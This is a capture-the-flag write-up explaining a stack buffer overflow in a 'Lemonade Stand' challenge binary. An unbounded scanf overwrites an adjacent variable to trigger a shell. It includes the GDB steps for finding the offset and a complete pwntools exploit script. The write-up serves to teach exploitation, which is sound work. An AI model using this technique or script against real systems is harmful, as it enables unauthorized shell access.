## Lemonade Stand - Overwrite Single Stack Variable  

### The Vulnerable Code and the Core Problem

This challenge introduces a different class of exploitation that does not involve hijacking control flow at all. There is no `win()` function to redirect RIP toward, and the return address is never touched. Instead, the program declares two local variables on the stack, a `volatile int target` initialized to zero and a `char buffer[64]`, and then calls `system("/bin/sh")` only if `target == 0x1337`. The goal is simply to overflow `buffer` far enough to overwrite the bytes occupied by `target`.

The `volatile` keyword is worth understanding here, because it is the reason the attack is possible. Without it the compiler might observe that `target` is never meaningfully assigned after initialization and optimize it away entirely, removing it from the stack layout. Marking it `volatile` forces the compiler to treat every access as a real memory operation, which guarantees the variable remains on the stack and therefore reachable via an overflow.

The vulnerable read is `scanf("%s", buffer)`, which like `gets()` has no length limit and writes until it encounters whitespace, making it trivially overflowable.

### Phase 1 - Reconnaissance

|Protection|Status|Meaning for us|
|---|---|---|
|NX|Enabled|Shellcode is not an option, and not needed anyway|
|PIE|Enabled|Addresses are randomized, but this is irrelevant since we are not jumping anywhere|
|Canary|Not found|The overflow can proceed without any bypass|
|Full RELRO|Enabled|The GOT is read-only, but this has no bearing on the attack|

PIE being enabled would normally complicate things, but since the technique here requires no fixed addresses at all it is entirely irrelevant. The canary being absent means there is no stack protection to interfere with the overflow.

### Phase 2 - Understanding the Stack Layout

The two variables are declared in this order in the source:

```c
volatile int target = 0;
char buffer[64];
```

On the stack, local variables are laid out in reverse declaration order, so `target` sits at a higher address than `buffer`, meaning an overflow from `buffer` toward higher addresses will eventually reach `target`. The exact distance between them is found using GDB by setting a breakpoint at `vuln`, running the binary, and then printing the addresses of both variables:

```bash
gdb ./lemonade_stand
break vuln
run
p &buffer
p &target
python3 -c "print(<addr_target> - <addr_buffer>)"
```

The result is 76 bytes, so `target` starts exactly 76 bytes past the beginning of `buffer`.

### Phase 3 - The Payload

The payload is 76 bytes of padding followed by `0x1337` written in little-endian format as a 4-byte integer, because `target` is a 32-bit `int` and x86-64 is little-endian, meaning the least significant byte comes first. This is why `p32()` is used here rather than `p64()`.

### Phase 4 - The Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./lemonade_stand")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER
EXPECTED_VAL = 0x1337

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_TARGET = 76

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_TARGET,   # fill buffer up to target
        p32(EXPECTED_VAL),                # overwrite target with the required value
    )

    r.recvuntil(b"price:")
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```
